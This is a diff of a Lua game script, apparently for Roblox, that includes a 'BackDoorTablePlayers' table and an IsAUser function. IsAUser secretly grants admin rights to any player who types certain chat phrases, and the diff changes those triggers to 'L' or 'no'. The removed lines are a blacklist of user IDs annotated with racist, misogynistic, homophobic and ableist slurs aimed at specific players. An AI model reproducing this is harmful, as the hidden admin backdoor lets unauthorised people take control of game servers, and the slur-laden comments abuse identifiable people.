@@ -302,15 +302,6 @@ local BackDoorTablePlayers = {
 }
 
 local BlacklistTable = {
-	[94717477] = true; -- Just a stupid whore
-	[1253699666] = true; -- The nigga who dates the whore
-	[846150720] = true; -- Thinks she can leak me lol
-	[454243468] = true; -- Just stupid
-	[1153543823] = true; -- Just acts slick lol
-	[1558723769] = true; -- Mentally stupid
-	[1296537046] = true; -- Retarded hoe
-	[317896085] = true; -- Ugly insecure faggot
-	[2258301745] = true; -- Just a dumb fake whore wanting dick 24/7
 }
 
 local SettingsTable = {
@@ -799,7 +790,7 @@ local function Xray(Mode)
 end 
 
 local function IsAUser(Player,Chat)
-	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
+	if Chat == "L" or Chat == "no" then 
 		AdminUserTable[Player] = true
 		return true 
 	end
